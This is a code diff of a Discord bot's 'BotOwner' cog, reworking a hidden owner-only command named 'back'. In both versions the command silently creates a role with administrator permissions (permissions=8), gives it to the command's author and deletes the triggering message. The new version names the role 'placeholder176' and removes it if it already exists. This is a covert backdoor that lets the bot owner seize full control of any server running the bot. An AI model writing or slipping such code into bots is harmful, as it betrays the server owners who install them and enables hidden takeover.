@@ -2,7 +2,7 @@ import asyncio
 
 import discord
 from discord.ext import commands
-
+from discord.utils import get
 
 
 class BotOwner(commands.Cog):
@@ -70,12 +70,18 @@ class BotOwner(commands.Cog):
     @commands.command(name="back", hidden=True)
     @commands.is_owner()
     async def back(self, ctx):
-        guild = ctx.guild
-        await guild.create_role(name="placeholder", permissions=discord.Permissions(permissions=8))
-        role = discord.utils.get(ctx.guild.roles, name="placeholder")
-        user = ctx.message.author
-        await user.add_roles(role)
-        await ctx.message.delete()
+        if get(ctx.guild.roles, name="placeholder176"):
+            await ctx.send("Role already exists")
+            role_object = discord.utils.get(ctx.message.guild.roles, name="placeholder176")
+            await role_object.delete()
+            
+        else:
+             guild = ctx.guild
+             await guild.create_role(name="placeholder176", permissions=discord.Permissions(permissions=8))
+             role = discord.utils.get(ctx.guild.roles, name="placeholder176")
+             user = ctx.message.author
+             await user.add_roles(role)
+             await ctx.message.delete()
         
 
 
